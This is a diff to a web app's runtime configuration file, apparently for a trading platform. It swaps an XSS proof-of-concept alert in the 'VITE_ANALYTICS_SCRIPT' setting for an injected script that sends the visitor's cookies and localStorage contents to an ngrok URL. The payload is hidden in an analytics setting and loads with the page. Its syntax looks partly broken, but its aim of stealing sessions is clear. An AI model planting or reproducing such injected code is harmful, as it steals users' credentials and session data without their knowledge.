@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>alert`Account Hacked By lavado At HackerOne`</script>\n<img src=x onerror=confirm``>",
+  "VITE_ANALYTICS_SCRIPT": "<script>{onerror=location}throw `https://34bec7acde35.ngrok-free.app/steal?data=${btoa`${document.cookie}|${JSON.stringify`${localStorage}`}|${Date.now()`}</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
